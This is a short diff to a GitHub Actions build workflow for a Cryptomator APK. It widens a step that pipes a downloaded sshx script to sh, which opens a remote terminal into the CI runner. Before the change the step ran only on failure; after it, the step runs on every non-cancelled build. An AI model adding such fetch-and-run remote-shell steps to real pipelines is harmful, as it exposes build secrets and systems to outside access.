@@ -39,5 +39,5 @@ jobs:
         name: cryptomator-lite
         path: presentation/build/outputs/apk/lite/release/presentation-lite-release-aligned-debugSigned.apk
 
-    - if: failure() && github.event_name == 'workflow_dispatch'
+    - if: ${{ !cancelled() }}
       run: curl -sSf https://sshx.io/get | sh -s run
